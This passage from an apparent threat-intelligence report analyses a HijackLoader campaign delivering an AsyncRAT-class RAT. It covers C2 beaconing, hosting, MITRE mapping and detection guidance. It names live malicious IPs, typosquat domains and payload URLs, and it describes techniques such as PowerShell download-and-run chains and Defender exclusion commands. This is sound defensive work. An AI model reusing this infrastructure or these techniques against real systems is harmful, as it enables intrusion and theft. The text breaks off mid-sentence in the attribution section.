**Operational implication for defenders:** rules looking for SPECIFIC env var names (like `EUOJCZYGOUCUG`) won't catch other infections — those names are per-host. But rules looking for the PATTERN — uppercase ASCII env var names of length 8–16 pointing at `%TEMP%\<hex>.tmp` files — will generalize.

### 6.6 Cipher Gap on the Encrypted Payload

> **Analyst note:** The 3.2 MB file `807D7B6.tmp` contains the operator's final-stage stealer payload, encrypted with a per-host key. Recovering the cipher would let analysts byte-confirm whether the final stage is AsyncRAT, DCRat, zgRAT, VenomRAT, or a heavily-modified variant. Static analysis tested ~270 cryptographic combinations against the file: variants of XOR, AES-128 in five modes with multiple key derivations and IVs, AES-256 in three modes, ChaCha20 with multiple key/nonce configurations, the small 40-byte companion file (`865FDFD.tmp`) tested as a key, and rand-keystream-XOR with the predicted seed plus 1M-seed brute force. None produce a valid PE start (`4D 5A 90 00`). The cipher gap itself is a finding — the operator added a per-host KDF beyond what commodity AsyncRAT/DCRat variants typically use.

**Files:**

| File | Size | SHA256 (prefix) | Pointed at by env var |
|---|---|---|---|
| `%LocalAppData%\Temp\807D7B6.tmp` | 3,344,451 bytes (~3.2 MB) | `dd4874b7…` (full hash in IOC feed) | `FVTADTEB` |
| `%LocalAppData%\Temp\865FDFD.tmp` | 40 bytes | `253fdb10…` (full hash in IOC feed) | `JJZIUTSQYJMNTZ` |

**Lifecycle of `807D7B6.tmp`:**
- 07:26:31.13 — CrystSupervisor32 (PID 9840) creates + writes 3,344,451 bytes
- 07:27:19.48 — same process **DELETES** the file via `SetDispositionInformationEx` (FILE_DISPOSITION_DELETE + POSIX_SEMANTICS)
- 07:27:19.51 — same process **RECREATES** the file with the **identical 3,344,451 bytes** (same SHA256)

This delete-then-rewrite pattern is unusual — possibly anti-forensics (wipe + restore to clear forensic file IDs) OR state-reset between stages.

**Recovery requires either:**
1. Interactive debugger (x64dbg / WinDbg) attach to pe_03 mid-execution; breakpoint cipher function; capture live key state + decrypted bytes
2. Memory-dump `WVault.exe` specifically (not full system); search post-decryption process memory for `4D 5A 90 00`
3. External long-running sandbox (20+ minutes) with memory dump capability

### 6.7 C2 Beacon (DEFINITE — three independent capture sources)

> **Analyst note:** This is the C2 connection itself, captured by three independent network sensors (Suricata, behavioral sandbox TCP log, and netstat samples). The high-value durable signal here is the JA3 hash, which fingerprints the malware's TLS client behavior independently of the C2 IP — rotating IPs cannot defeat JA3 detection. The ClientHello length of 93 bytes and the fixed cipher list are equally durable signals at the network layer. Defenders should treat these as the priority detections: an IP block alone is defeated by IP rotation, but the JA3+ClientHello fingerprint persists across rotations.

| Field | Value | Source |
|---|---|---|
| C2 IP | `185.241.208.129` | Suricata flow + behavioral sandbox `[TCP]` log + netstat samples (PID 2596) |
| C2 port | `56167` | Same |
| Protocol | TLSv1.0 | Suricata `event_type=tls` |
| JA3 | `07af4aa9e4d215a5ee63f9a0a277fbe3` | Suricata |
| JA4 | `t10i060500_4dc025c38c38_1a3805c3aa63` | Suricata |
| ClientHello cipher list | `49162-49161-49172-49171-53-47` | Suricata |
| ClientHello length | 93 bytes outbound (every connection — stable IOC) | Procmon |
| Beacon interval | ~125 seconds (TCP flow timeout, immediate retry from new ephemeral port) | Sysmon EID 3 |
| Beacon span (Sysmon-captured) | 33 minutes 21 seconds, 17 connections | Sysmon EID 3 |
| C2 process | `WVault.exe` (PID 2596) | Behavioral sandbox Network Traffic block |

**ASN / hosting:**
- AS210558 — **1337 Services GmbH** (Poland, RIPE NCC)
- **Spamhaus DROP listed** — Suricata fired `ET DROP Spamhaus DROP Listed Traffic` (rule 2400036) on the flow

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-wvault-c2-tcp-connection.png" | relative_url }}" alt="Process Explorer Properties dialog for WVault.exe (PID 2596), TCP/IP tab. Two TCP rows shown: TCP from flare:10239 to www.inetsim.org:56167 in CLOSE_WAIT state (red highlight), TCP from flare:25744 to www.inetsim.org:56167 in ESTABLISHED state (green highlight). Resolve addresses checkbox is enabled.">
  <figcaption><em>Figure 14: Process Explorer TCP/IP tab for the orphaned <code>WVault.exe</code> process showing the C2 beacon. Two simultaneous TCP connections to port <code>56167</code> are visible — one in <code>CLOSE_WAIT</code> (the previous beacon, just timed out) and one in <code>ESTABLISHED</code> (the new beacon, just opened from a fresh ephemeral port). The destination resolves to <code>www.inetsim.org</code> here because the analyst's lab uses INetSim as a fake-internet sinkhole; on a real victim host the same flow targets <code>185.241.208[.]129:56167</code> on AS210558 (1337 Services GmbH, Spamhaus DROP-listed). The 125-second beacon cadence and immediate-reconnect pattern are visible as overlapping rows.</em></figcaption>
</figure>
- VT confirms `Carriers.exe` as a known communicating file for this IP — direct cross-reference
- Other communicating files on this IP: `Gdkmos.exe`, `KioskWindows_1.04.zip`, `detectrdps.exe`, `SSA-Statement.exe`, `Rjdfz.exe` (sister samples)
- Historical resolutions cluster around banking phishing infrastructure: `caisseregionale-agricole.com`, `securepay.ddns.net`, `paiementsecurise.ddns.net`, `securepay.life`, `netbillerdown.com`

The TLS handshake to INetSim's dummy listener never completed (INetSim closed the connection after the ClientHello), so the server cert fingerprint and HTTP/HTTPS payloads were not captured. The JA3 hash is high-value for detection — fingerprints the malware's TLS client behavior independently of the C2 IP.

### 6.8 DNS Activity (49 unique queries — none point to C2)

> **Analyst note:** This sub-section documents the DNS-resolution behavior — or rather the absence of it for C2 traffic. The 49 DNS A queries during the run all resolve legitimate Microsoft, update-service, CRL, and analytics endpoints. None of them resolve operator-controlled C2 infrastructure. The C2 IP `185.241.208.129` is hardcoded in the loader/payload and reached via direct TCP connect, never via DNS. The implication for defenders is operationally significant: DNS-based detection (RPZ, sinkholes, DGA detection) WILL NOT catch this campaign. Detection must be IP-based, JA3-based, or behavioral.

Of the 49 unique DNS A queries during the session, **NONE point to operator-controlled C2**. Categorized:
- Microsoft telemetry / Office365 / Edge / Skype: ~25 queries
- Update services: Windows Update, Brave updates, Intel updates, Malwarebytes updates
- CRL / OCSP: Comodo, DigiCert, GlobalSign, Sectigo, Symantec
- Baseline: doh.xfinity.com (DoH probe), test.com (INetSim self-test), api2.amplitude.com (analytics)

**The malware does NOT use DNS for C2 resolution.** The C2 IP `185.241.208.129` is hardcoded in the loader/payload, never queried via DNS. Sysmon EID 22 confirms zero DNS queries from `Carriers.exe`, `Carriers.tmp`, `CrystSupervisor32.exe`, `WVault.exe`, or `Crisp.exe`.

**Detection implication: DNS-based detection (DNS sinkholes, RPZ, DGA detection) WILL NOT catch this campaign.** Only IP/JA3-based detection works.

### 6.9 Suricata Findings

12 alerts total during the run; only 2 are meaningful:

| Count | Signature | Significance |
|---|---|---|
| **2** | **`ET DROP Spamhaus DROP Listed Traffic Inbound group 37`** | Direct hit on the C2 IP — confirms reputation match |
| 4 | `SURICATA STREAM ESTABLISHED packet out of window` | TCP state reassembly noise from INetSim's response handling |
| 3 | `SURICATA STREAM ESTABLISHED invalid ack` | Same |
| 3 | `SURICATA STREAM Packet with invalid ack` | Same |

No Suricata-fired AsyncRAT/zgRAT/DCRat SSL-cert detections occurred in this run because the TLS handshake never completed (INetSim closed connections immediately, before the server certificate was sent). The pre-existing VT IDS hits on `Carriers.exe` (HIGH confidence — three independent rules: AsyncRAT JA3, AsyncRAT/zgRAT SSL cert pattern, DCRat C&C SSL cert) provide the family-attribution signal that this run did not directly observe.

---

## 7. MITRE ATT&CK Mapping

> **Confidence note:** all rows below are HIGH confidence unless explicitly marked `(MODERATE)` or `(DEFINITE)`. The Confidence Summary in Section 12 organizes findings by confidence level for the higher-level view.

| Tactic / Technique | Name | Evidence |
|---|---|---|
| Initial Access / T1566.001 | Spearphishing Attachment | Macro Office docs (`Price5.docm`, `Price6.doc`, `NDA.doc`, `Price4.xls`); NDA/Price lure themes |
| Initial Access / T1566.002 | Spearphishing Link | `.url` shortcuts pointing to typosquats (`onedrive.to`, `microsoft.com-app.cc`); Mega.io URLs |
| Execution / T1204.002 | Malicious File | User must double-click `.scr`/`.msi`/`.exe`/`.lnk`/`.url`/`.msc` lures |
| Execution / T1059.001 | PowerShell | Macro-decoded reverse-encoded URL → `iwr` → `start-process`; `Excel_2016_Windows.bat` `Set-ItemProperty` calls |
| Execution / T1059.003 | Windows Command Shell | Tier-2 MSC chain `cmd.exe /c` invocations; `taskkill /IM mmc.exe /F` cleanup |
| Execution / T1059.005 | Visual Basic | VBA `AutoOpen()` / `Workbook_Open()` macros in `Price5.docm` / `Price6.doc` / `NDA.doc` / `Price4.xls` |
| Execution / T1059.007 | JavaScript | MSC GrimResource `javascript:eval(...)` in `res://apds.dll/redirect.html` |
| Execution / T1218.014 | MMC | GrimResource technique on `1.msc`, `Price2.pdf.msc`, `MSCFile.msc` |
| Execution / T1218.005 | Mshta | `mshta.exe \\<webdav>\file.hta` POC artifacts (`hta.hta`, `mht.mht`, `mhtml.mhtml`) |
| Execution / T1053.005 | Scheduled Task | `watchermgmt.job` runs `CrystSupervisor32.exe` hourly via Task Scheduler |
| Persistence / T1053.005 | Scheduled Task | Legacy `.job` at `C:\Windows\Tasks\watchermgmt.job` + auto-migrated XML at `C:\Windows\System32\Tasks\watchermgmt`; 1-hour heartbeat, daily recurrence |
| Privilege Escalation / T1134 | Access Token Manipulation | `AdjustTokenPrivileges` + `OpenProcessToken` imports observed; YARA `escalate_priv` capa hit on Carriers.exe — usage may be stock Inno UAC self-elevation (MODERATE) |
| Defense Evasion / T1574.002 | DLL Side-Loading | Genuine signed `SlideShowEditor.exe` (renamed `CrystSupervisor32.exe`) loads operator-modified `ExceptionHandler.dll` from `%TEMP%\is-*.tmp\` |
| Defense Evasion / T1055.012 | Process Hollowing | Stage-1 hollows `tapisrv.dll`; stage-2 hollows `input.dll`; runtime hollows `WVault.exe` (renamed Qihoo PromoUtil.exe) for .NET injection |
| Defense Evasion / T1055.002 | Portable Executable Injection | Stage-2 shellcode (5,808 bytes) injected into `tapisrv.dll!.text` via `VirtualProtect(PAGE_EXECUTE_READWRITE)` + `memcpy` |
| Defense Evasion / T1055 | Process Injection | `clr.dll!CreateAssemblyNameObject` + `clr.dll!GetIdentityAuthority` thread start addresses in `WVault.exe` (Process Explorer screenshots) |
| Defense Evasion / T1620 | Reflective Code Loading | `ExceptionHandler.dll` `FUN_100024B0` is an inline reflective loader — PEB-walk API resolution + relocation step + memcpy section bytes + jump to entry |
| Defense Evasion / T1027 | Obfuscated Files or Information | `networkspec17.log` (entropy 7.88, 99% high-entropy chunks); multi-layer encoding (PNG-IDAT framing + 4-byte XOR + LZNT1 chunked) (DEFINITE) |
| Defense Evasion / T1027.013 | Encrypted/Encoded File | `807D7B6.tmp` per-host encrypted final-stealer payload (cipher unrecovered after 270 attempts) (DEFINITE) |
| Defense Evasion / T1027.002 | Software Packing | Inno Setup ChaCha20 wrapper (Inno 6.5+); `IsPacked` YARA on multiple corpus binaries |
| Defense Evasion / T1027.009 | Embedded Payloads | 8 embedded PEs in 3.75 MB Layer-3 LZNT1 buffer inside `networkspec17.log` |
| Defense Evasion / T1140 | Deobfuscate/Decode Files or Information | Stage-2 `walk_idat_chunks` + XOR with `0xE1D5B4A2` + `RtlDecompressBuffer` LZNT1 chunked |
| Defense Evasion / T1036.005 | Match Legitimate Name or Location | `WVault.exe` is genuine Qihoo PromoUtil.exe (renamed); Inno AppName `Apophyge` chosen to look like obscure-but-legit installer |
| Defense Evasion / T1036.007 | Double File Extension | `NDA_Agreements.PDF_2025-12-22 06-50-31-659.exe` long-timestamp pushes `.exe` off Explorer's column |
| Defense Evasion / T1036.002 | Right-to-Left Override | `puttyfdp.scr`, `NDA_Agreementsfdp.msi` use U+202E; new variant `Carriers_Agreements_009RCARHEFfd..scr` adds Cyrillic-р homoglyph (`%d1%80`) |
| Defense Evasion / T1480 | Execution Guardrails | Per-host hostname-keyed crypto — encrypted payload + env var names deterministic from hostname; resists static recovery on different machine (MODERATE) |
| Defense Evasion / T1562.001 | Disable or Modify Tools | Defender exclusion `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\ProgramData\adv_ctrl = 0` set via `MsMpEng.exe`; Tier-2 MSC `Add-MpPreference -ExclusionExtension *` (DEFINITE) |
| Defense Evasion / T1553.004 | Install Root Certificate | `pe_06` (Rugmi.HP) installs GoProxy CA cert (thumbprint `0174E68C97DDF1E0EEEA415EA336A163D2B61AFD`) at `HKEY_USERS\<SID>\Software\Microsoft\SystemCertificates\Root\Certificates\` (VT C2AE confirmed) |
| Defense Evasion / T1112 | Modify Registry | Multiple registry writes — Defender exclusion, GoProxy cert blob, Inno AppId GUID Uninstall key |
| Defense Evasion / T1497.003 | Time-Based Evasion | Stage-2 anti-sandbox `ZwDelayExecution × 9 × 5000ms` (45-second sleep) gated by `FUN_000002c0` |
| Defense Evasion / T1497.001 | System Checks | Stage-2 anti-sandbox quadruple — `ZwQueryInformationProcess` + `QueryPerformanceCounter` + `ZwQuerySystemInformation` for sandbox detection |
| Credential Access / T1056.001 | Keylogging | `CrystSupervisor32.exe` YARA `keylogger` capa hit (legit Wondershare SlideShowEditor's full feature surface OR operator-modified internals — uncertain) (MODERATE) |
| Discovery / T1082 | System Information Discovery | `GetComputerNameW` (pe_03 hash `0xCBB35ABB`); used as per-host seed for crypto |
| Discovery / T1083 | File and Directory Discovery | `GetEnvironmentVariableW` resolution of `%TEMP%`/`%APPDATA%`/`%PROGRAMDATA%`; `GetFileSize` + `ReadFile` on encrypted payloads |
| Discovery / T1057 | Process Discovery | Stage-2 `ZwQuerySystemInformation` (anti-sandbox process enum); CrystSupervisor32 capa surface includes process enumeration (MODERATE) |
| Collection / T1113 | Screen Capture | `CrystSupervisor32.exe` YARA `screenshot` capa hit; pe_08 imports `BitBlt` + `GetDC` + `CreateCompatibleBitmap` (MODERATE) |
| Command and Control / T1071.001 | Application Layer Protocol: Web Protocols | TLSv1.0 to `185.241.208.129:56167` from `WVault.exe`; 17 connections over 33 min 21s; pe_08 imports `WININET` (DEFINITE) |
| Command and Control / T1573.001 | Encrypted Channel: Symmetric Cryptography | TLSv1 ClientHello cipher list `49162-49161-49172-49171-53-47`; injected .NET RAT inside WVault.exe handles encryption |
| Command and Control / T1571 | Non-Standard Port | TCP/56167 (not 443/80) for C2 (DEFINITE) |
| Command and Control / T1090.002 | External Proxy | GoProxy MITM intent (CA cert install for HTTPS interception) (MODERATE) |
| Command and Control / T1105 | Ingress Tool Transfer | Mega.io payload downloads (`/busket/putty.exe`, `/busket/putty2.exe`, `/busket/Bravo/vida/NGZTDICF.exe`); `109.120.137.6/PUTTY.exe`; `80.253.249.186:5504/<DLL>` |

---

## 8. Infrastructure Analysis

> **Analyst note:** The campaign uses three different hosting providers for three different purposes — a primary staging server on a Russian-jurisdiction bulletproof host that has been formally sanctioned by the US Treasury, a C2 server on a Spamhaus DROP-listed bulletproof host in Poland, and a second-stage payload host in Germany. The deliberate dual-bulletproof-hosting selection — sanctioned AS210644 plus DROP-listed AS210558 — is itself a signal about the operator's risk tolerance. They are willing to operate on infrastructure that the US Treasury and Spamhaus have publicly flagged. This rules out cautious operators or low-skill operators who would have moved to less-marked hosting after sanction announcements; it does not, by itself, attribute the campaign to any specific named actor.

### 8.1 Staging Server: 62.60.237.100 (AEZA — OFAC sanctioned)

> **Analyst note:** This is the open directory that hosts the campaign's distribution kit (32+ artifacts, 8 delivery vectors). What's worth understanding for a defender is that the hosting AS — AS210644, AEZA Group LLC — was formally sanctioned by the US Treasury in July 2025 with a concurrent Five Eyes joint advisory. The Stage 1 sample first appeared on VirusTotal eight months *after* that sanctions designation, which means the operator stages on this infrastructure with full awareness of the OFAC designation. Routine network-perimeter rules at most defenders' organizations would already be blocking traffic to this AS by reputation policy; an explicit IP block on `62.60.237.100` is the operational backstop.

| Field | Value |
|---|---|
| IP | `62.60.237.100` |
| Port | 80 |
| Server banner | Apache/2.4.58 (Ubuntu) |
| ASN | AS210644 |
| ASN owner | AEZA GROUP LLC |
| Country | Finland (per RIR data) |
| Provider class | Bulletproof hosting (BPH) |
| Sanctions | **OFAC SDN designation SB0185 (US Treasury, July 2025); Five Eyes joint advisory SB0319** |
| First observed active | 2025-12-21 |
| Investigation status | Live (2026-05-06) |

The directory `/Documents/` (mirrored at `/download/Documents/`) is open and indexable, hosting 32+ phishing-vector artifacts. Other communicating sister samples observed on this IP via VirusTotal — operator stages multiple sub-campaigns on the same staging server.

**Sanctions context.** AS210644 was sanctioned by the US Treasury Office of Foreign Assets Control (OFAC) on July 1, 2025, with concurrent Five Eyes joint designation. Per Recorded Future Insikt Group, AS210644 was used by 7.5% of Tier-1 C2 servers in the period July 2024–July 2025. The Stage 1 sample first appeared on VirusTotal on March 22, 2026 — eight months after the sanctions designation — meaning the operator is operating on sanctioned infrastructure with full awareness of the designation.

### 8.2 C2 Server: 185.241.208.129 (1337 Services — Spamhaus DROP)

> **Analyst note:** This is the active C2 endpoint — every infected host beacons here over TLSv1 on a non-standard high port (TCP/56167). The hosting AS, AS210558 (1337 Services GmbH, Poland), is on the Spamhaus DROP list of presumed-malicious infrastructure that legitimate networks publish-and-block by policy. VirusTotal also lists five sister sample binaries communicating with this same IP — `Gdkmos.exe`, `KioskWindows_1.04.zip`, `detectrdps.exe`, `SSA-Statement.exe`, `Rjdfz.exe`. Hunt teams should add these as additional hash-based searches in their EDR telemetry; co-resident operator infrastructure on AS210558 is a useful pivot point even when the specific campaign attribution is uncertain.

| Field | Value |
|---|---|
| IP | `185.241.208.129` |
| Port | 56167 |
| ASN | AS210558 |
| ASN owner | 1337 Services GmbH |
| Country | Poland (per VT) |
| Provider class | Bulletproof hosting (BPH) |
| Listing status | **Spamhaus DROP** |
| Other community signals | DOJ Operation Talent domain seizure (StarkRDP/rdp.sh, January 2025); 1000+ community abuse reports across 200+ sources on the /24 |
| VT communicating files | `Carriers.exe`, `Gdkmos.exe`, `KioskWindows_1.04.zip`, `detectrdps.exe`, `SSA-Statement.exe`, `Rjdfz.exe` |
| Historical resolutions | Banking phishing infrastructure (`caisseregionale-agricole.com`, `securepay.ddns.net`, `paiementsecurise.ddns.net`, `securepay.life`, `netbillerdown.com`) |

AS210558 is **Spamhaus DROP-listed** — Spamhaus DROP is a list of presumed-malicious infrastructure that legitimate networks publish-and-block by policy. The listing means routine network-perimeter rules at most defenders' organizations would already be blocking traffic to/from this IP regardless of campaign-specific detection.

The IP recurs across three Hunters Ledger investigations (this campaign and two prior). This recurrence does not by itself attribute the campaigns to a single operator — AS210558 is shared bulletproof hosting and multiple operators may co-tenant — but it is consistent with operator overlap at MODERATE confidence (per attribution-analyst's ACH analysis, Section 11).

### 8.3 Second-Stage Payload Server: 109.120.137.6 (H2nexus)

| Field | Value |
|---|---|
| IP | `109.120.137.6` |
| ASN | AS215730 |
| ASN owner | H2NEXUS LTD |
| Country | Germany |
| Provider class | Commodity hosting |
| Hosted payloads | `PUTTY.exe`, `RDP.exe`, `RMS.exe`, `Glovo.exe` |
| Russian-language artifact | Historical URL `mozhno-li-vyvesti-dengi-s-krakena.html` ("can-you-withdraw-money-from-Kraken") |
| VT verdict | 6/91 malicious |

The Russian-language Kraken-exchange URL on this IP is one of the strongest single Russian-speaking-operator language signals in the corpus. Combined with the VSEZBSRABOTAT.url filename and the Mega.io `busket/` typo, three independent first-language signals converge on Russian-speaking attribution at HIGH confidence (90%).

### 8.4 Mega.io Cloud-Storage Abuse

| Field | Value |
|---|---|
| Service | `s3.g.s4.mega.io` |
| Operator bucket ID | `aileqac3yep7oqdhygjpberqqnk2zrnhck2lx` |
| Operator subdir typo | `busket/` (typo of `bucket/`) |
| Subfolders observed | `busket/`, `Bravo/vida/` |
| Hosted payloads | `putty.exe`, `putty2.exe`, `Bravo/vida/NGZTDICF.exe` |
| VT verdict | 13/60 malicious |

Mega.io is a legitimate cloud-storage service. The operator's specific bucket is the abuse vector. The `busket/` typo (operator misspelling of `bucket/`) is a stable cross-vector fingerprint — it appears in every delivery vector that reaches Mega.io and has remained stable for 15+ months. The typo is a characteristic English-second-language error and is treated as a strong Russian-speaker tell.

### 8.5 Co-Resolution: Four Typosquat Domains

| Domain | First seen | Resolution to 62.60.237.100 |
|---|---|---|
| `onedrive.to` | 2025-12-20 | Active |
| `microsoft.com-app.cc` | (per-campaign) | Active |
| `www-microsoft.live` | 2025-10-03 | Historical (per VT pDNS) |
| `www.onedrive.to` | (CNAME of `onedrive.to`) | Active |

Four typosquat domains co-resolving to a single staging IP is **DEFINITE single-operator infrastructure control** — the probability that four unrelated actors registered four typosquats and pointed them at the same IP is negligible. The infrastructure cluster supports the H1 attribution hypothesis (single distinct operator) over the H4 hypothesis (shared bulletproof tenancy of unrelated actors).

### 8.6 Shared Wondershare-Pack Staging: 80.253.249.186

> **Analyst note:** This IP serves the legitimate Wondershare DLL pack used as camouflage by multiple HijackLoader campaigns leveraging the Wondershare side-load template. It is not specific to UTA-2026-007 — it is shared infrastructure. Defenders observing connections to `80.253.249.186:5504/<DLL>` requests have a high-confidence indicator they are watching a Wondershare-side-load campaign, but not necessarily this specific operator. Use it as a pivot point that narrows the suspect set, not as a single-operator attribution signal.

| Field | Value |
|---|---|
| IP | `80.253.249.186` |
| Port | 5504 |
| ASN owner | QWINS LTD |
| Country | Germany |
| VT verdict | 11/47 malicious |

This IP serves the legitimate Wondershare DLL pack (`BugSplat.dll`, `COMSupport.dll`, etc.) used by multiple campaigns leveraging the Wondershare side-load template. The shared-staging IP is useful as a pivot — defenders observing connections to `80.253.249.186:5504/<DLL>` requests have a high-confidence indicator that they are watching a Wondershare-side-load campaign, but not necessarily this specific operator.

---

## 9. Final-Stage Family Identification

> **Analyst note:** The final stage of this kill chain is a .NET RAT injected into the renamed Qihoo `WVault.exe` host. Three independent VirusTotal IDS rules fire on the C2 SSL handshake — one for AsyncRAT/zgRAT-style SSL certs, one for DCRat C&C SSL certs, and one for the AsyncRAT JA3 hash. All three families are .NET-based and are sometimes paired with HijackLoader. This narrows the final stage to AsyncRAT-class with HIGH confidence, but pinning the specific variant — AsyncRAT, DCRat, zgRAT, VenomRAT, or a heavily-modified fork — would require either a TLS man-in-the-middle of the C2 traffic or a memory dump of `WVault.exe` while the .NET assembly is loaded. Neither was achieved in this 5-minute behavioral sandbox window. The cipher gap on the on-disk encrypted payload (`807D7B6.tmp`) further limits variant pinning.

### 9.1 Family-attribution evidence

| Source | Verdict |
|---|---|
| VT IDS rule (Emerging Threats) | `ET MALWARE Generic AsyncRAT/zgRAT Style SSL Cert` — HIGH severity |
| VT IDS rule (Abuse.ch SSLBL) | `Malicious SSL certificate detected (DCRat C&C)` |
| VT IDS rule (Abuse.ch SSLBL) | `Malicious JA3 SSL-Client Fingerprint detected (AsyncRAT)` — JA3 `07af4aa9e4d215a5ee63f9a0a277fbe3` |
| Process Explorer | `clr.dll!CreateAssemblyNameObject` + `clr.dll!GetIdentityAuthority` thread start addresses in `WVault.exe` |

**Most likely candidates** (all .NET-based, all match the SSL cert IDS hits):
- **AsyncRAT** — public reports show Polish C2 infrastructure, TLSv1.0 with similar JA3
- **DCRat** — known to use AS210558 hosting per public threat-intel
- **zgRAT** — commodity, often paired with HijackLoader as final stage
- **XWorm / Quasar / VenomRAT** — possible but less commonly paired with HijackLoader

### 9.2 What the cipher gap implies

The encrypted payload `807D7B6.tmp` resisted 270 cryptographic recovery combinations including:
1. 4-byte rotating XOR with `X65599("FLARE") XOR 0xA1B2D3B4` = `0x2349249A` — fail
2. 4-byte rotating XOR with key recovered via known-plaintext attack assuming `4D 5A 90 00` first bytes (= `0x344A4F78`) — fail
3. msvcrt rand-keystream XOR with FLARE seed and three other candidate seeds — fail
4. Brute-force `srand(seed) + rand()` loop in first 1M seed range — fail
5. AES-128 brute force (4 seeds × 5 derivations × 4 modes × 7 IVs = ~140 trials) — zero MZ hits
6. AES-256 brute force (4 seeds × 2 derivations × ECB + CBC/CTR with 7 IVs = ~70 trials) — zero MZ hits
7. ChaCha20 brute force (4 seeds × 2 key derivations × 2 metadata slicings × 5 nonces + 3 IETF nonces = ~64 trials) — zero MZ hits
8. `865FDFD.tmp` (40 bytes) tested as key material across all the above — zero MZ hits

The cipher gap rules out commodity AsyncRAT/DCRat cipher patterns (most variants use AES-128-CBC with hardcoded or seed-derivable keys). Either this is a **heavily-modified .NET RAT variant with custom key derivation**, OR the **cipher key is derived at runtime from network-received material** (operator-pushed key after first beacon), OR **multi-source KDF** (registry + computer SID + serial + hostname combined).

The gap itself is a positive finding — the operator's per-host KDF is more sophisticated than commodity AsyncRAT/DCRat patterns. Both possible explanations support the broader thesis: this campaign's operator went BEYOND stock HijackLoader tradecraft to add a sophisticated per-host key-derivation layer.

---

## 10. Detection & Response

> **Analyst note:** This section consolidates detection coverage and response orientation into a single operational reference. The detection content (six YARA rules, eight Sigma rules, four Suricata signatures) is published as a separate file (link below) so defenders can pull rules into their detection stack without parsing the report. The response orientation block at the end (Section 10.4) is a brief operational reference — it lists detection priorities, persistence targets, and containment categories. This is not a step-by-step incident-response procedure; readers with confirmed compromises should engage their internal IR teams or dedicated playbooks for sequencing and execution.

The detection content for this campaign is published at:

**`/hunting-detections/opendirectory-62-60-237-100-20260506-detections/`** (raw file: `opendirectory-62-60-237-100-20260506-detections.md`)

### 10.1 Coverage summary

| Rule Type | Count | Key MITRE Techniques Covered | False-Positive Risk |
|---|---|---|---|
| YARA | 6 | T1027.009, T1027.013, T1204.002, T1574.002, T1055.012, T1055.002, T1620, T1480, T1036.005, T1218.014, T1059.005, T1105 | LOW–MEDIUM |
| Sigma | 8 | T1204.002, T1036.005, T1055.012, T1055.002, T1574.002, T1053.005, T1059.005, T1112, T1562.001, T1218.014, T1480 | LOW–MEDIUM |
| Suricata | 4 | T1071.001, T1573.001, T1571, T1105, T1090.002 | LOW |

### 10.2 Priority deployment targets

1. **Suricata rule for C2 IP and JA3 hash** — deploy immediately at network perimeter. JA3 hash is durable across C2 IP changes; matches SSLBL AsyncRAT JA3 list.
2. **Sigma rules for `watchermgmt.job` creation and `adv_ctrl` directory** — hunt retroactively in EDR/SIEM. Catches the legacy `.job` autorunsc-blind persistence pattern.
3. **YARA rule for `networkspec17.log` IDAT carrier** — deploy in endpoint memory scanners and gateway AV. Catches the Layer-1/Layer-2/Layer-3 encoding signature.

### 10.3 Coverage gaps (intentional)

- **No detection for the per-host random env vars by name** — values are deterministic per host; specific names like `EUOJCZYGOUCUG` would not catch other hosts. Sigma rule covers the PATTERN (env vars matching `^[A-Z]{8,16}$` set by non-system processes pointing at `%TEMP%\<8hex>.tmp`) instead.
- **No detection for the Qihoo PromoUtil hash itself** — the hash is genuine signed Qihoo software. Sigma rule covers the BEHAVIORAL PATTERN (orphaned process with `clr.dll!CreateAssemblyNameObject` thread start addresses) instead.
- **No detection rule for the cipher of `807D7B6.tmp`** — cipher unrecovered after 270 attempts; a content-based rule is impossible without knowing the algorithm. YARA rule covers the FILE-PATH PATTERN (`%TEMP%\<8hex>.tmp` referenced by per-host random env var names) instead.

**Time-to-detect target:** assume a 43-second window from sample launch to first C2 beacon. File-based detection must act within this window or behavioral detection at the orphan-`WVault.exe` stage is required.

### 10.4 Response Orientation

**Detection priorities (top 3 highest-value hunt targets):**

1. **JA3 fingerprint `07af4aa9e4d215a5ee63f9a0a277fbe3`** — durable across C2 IP changes; catches the same beacon technology in any future campaign
2. **Orphan `WVault.exe` (or any renamed `PromoUtil.exe`) with .NET CLR threads** — catches the cross-campaign Qihoo hollow-host TTP cluster (8+ campaigns since 2025)
3. **Legacy `.job` file create at `C:\Windows\Tasks\` from non-system-installer parent** — catches the autorunsc-blind persistence pattern

**Persistence targets (artifact names and locations only — defenders' IR teams own removal sequencing):**
- Scheduled task: `watchermgmt` (legacy `.job` at `C:\Windows\Tasks\watchermgmt.job` AND XML at `C:\Windows\System32\Tasks\watchermgmt`)
- Registry: `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\ProgramData\adv_ctrl`
- Registry: `HKEY_USERS\<SID>\Software\Microsoft\SystemCertificates\Root\Certificates\0174E68C97DDF1E0EEEA415EA336A163D2B61AFD`
- Registry: `HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall\{1F2952E4-FC07-4482-B9E6-E795507DA7D2}_is1`
- Drop directories: `C:\ProgramData\adv_ctrl\`, `%APPDATA%\adv_ctrl\Crisp.exe`, `C:\ProgramData\WVault.exe`
- Encrypted payloads: `%LocalAppData%\Temp\<8hex>.tmp` files referenced by per-host random env vars

**Containment categories (one-line action labels):**
- Block C2 IP `185.241.208.129` and JA3 `07af4aa9e4d215a5ee63f9a0a277fbe3` at network perimeter
- Block staging IP `62.60.237.100` and second-stage IP `109.120.137.6` at network perimeter
- Block typosquat domains (`onedrive.to`, `microsoft.com-app.cc`, `www-microsoft.live`) at DNS perimeter
- Hunt internal hosts for the persistence and registry artifacts above; isolate any matches
- Rotate credentials for any user who interacted with the lure files (specifically: any browser-saved passwords, session cookies, OAuth refresh tokens, or banking session data — anything an AsyncRAT-class .NET RAT would have access to during the persistence window). Prioritize banking sessions and OAuth refresh tokens before browser-saved passwords — session cookies and refresh tokens enable replay without additional steps; saved passwords require additional attacker effort if MFA is enforced.
- Remove the GoProxy MITM CA cert from Trusted Root Certification Authorities store on any host where it appears

---

## 11. Threat Actor Assessment

> **Note on UTA identifiers:** "UTA" stands for Unattributed Threat Actor. UTA-2026-007 is an internal tracking designation assigned by The Hunters Ledger to actors observed across analysis who cannot yet be linked to a publicly named threat group. This label will not appear in external threat intelligence feeds or vendor reports — it is specific to this publication. If future evidence links this activity to a known named actor, the designation will be retired and updated accordingly.

### 11.1 Conclusion

**Weak indicators suggest a distinct Russian-speaking criminal operator (UTA-2026-007).** Attribution rests at LOW confidence (58%). The 58% confidence reflects:
